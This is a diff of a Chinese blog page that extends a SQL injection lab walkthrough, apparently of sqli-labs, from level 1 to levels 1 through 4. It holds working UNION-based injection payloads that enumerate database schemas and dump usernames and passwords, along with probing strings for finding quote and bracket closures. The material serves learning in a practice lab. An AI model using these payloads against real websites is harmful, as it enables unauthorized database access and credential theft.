@@ -17,7 +17,7 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>Leve1 - lll-nnnのblog</title>
+  <title>Level1~~level4 - lll-nnnのblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -162,7 +162,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Leve1">
+            <span class="h2" id="subtitle" title="Level1~~level4">
               
             </span>
 
@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      203 字
+      403 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      6
        分钟
     </span>
   
@@ -224,12 +224,18 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Leve1</h1>
+            <h1 style="display: none">Level1~~level4</h1>
             
             <div class="markdown-body">
-              <h2 id="leve1"><a href="#leve1" class="headerlink" title="leve1"></a>leve1</h2><p>输入id=1,有回显；此外，2，3，4……12均有回显，说明有12条数据。</p>
+              <h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>输入id=1,有回显；此外，2，3，4……12均有回显，说明有12条数据。</p>
 <p>接下来使用<code>order by 1 %23</code><br><code>order by 1,2 %23</code><br>…….<br>得到一共有三列<br>将id=1改为一个数据库不存在的id值，如861，使用union select 1,2,3联合查询语句查看页面的显示位。<br><img src="https://ftp.bmp.ovh/imgs/2021/01/7fe5a0b12e1c7810.png" srcset="/img/loading.gif"><br>2，3两个显示位；<br><code>id=33&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 %23</code> 得到库名<img src="https://ftp.bmp.ovh/imgs/2021/01/e273266cd62bab04.png" srcset="/img/loading.gif"><br>获取security库中的表<br><code>id=33&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;) %23</code><img src="https://ftp.bmp.ovh/imgs/2021/01/bff49f0f721798e4.png" srcset="/img/loading.gif"><br>users下的列名<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/fd5c32324cb27880.png" srcset="/img/loading.gif"></p>
-<p>username:<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(username) from security.users) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/a68dcca44529904f.png" srcset="/img/loading.gif"><br>password:<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(password) from security.users) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/79f09d504315ca8b.png" srcset="/img/loading.gif"></p>
+<p>username:<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(username) from security.users) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/a68dcca44529904f.png" srcset="/img/loading.gif"><br>password:<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(password) from security.users) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/79f09d504315ca8b.png" srcset="/img/loading.gif">            </p>
+<hr>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><code>?id=1</code>正常输出<br><code>?id=1&#39;</code>报错<br><code>?id=1&quot;</code>报错<br><code>?id=3-1</code>正常输出<br>判断为数值型注入<br><code>?id=33 union select 1,2,3%23</code>正常回显<br>按第一关的步骤可以得出      </p>
+<hr>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><code>?id=1&#39;</code>报错<br><code>?id=1&quot;</code>正常输出<br>本来以为是<code>&quot;&quot;</code>的闭合，但后面的操作进行不出来；<br><code>?id=1&#39;)%23</code>也能正常输出<br><code>?id=1&#39;) order by 1,2,3,4%23</code>报错输出<br><code>?id=1&#39;) union select 1,2,3%23</code>正常输出<br>所以应该是<code>(&#39;&#39;)</code>的闭合     </p>
+<hr>
+<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><code>?id=1&#39;</code>正常输出<br><code>?id=1&quot;%23</code>报错<br><code>?id=1&#39;)%23</code>正常输出，但<code>order by 1,2,3,4</code>没有报错<br><code>?id=1&quot;)%23</code>正常输出<br><code>?id=1&quot;) order by 1,2,3,4%23</code>正常报错<br>说明闭合形式为<code>(&quot;&quot;)</code></p>
 
             </div>
             <hr>
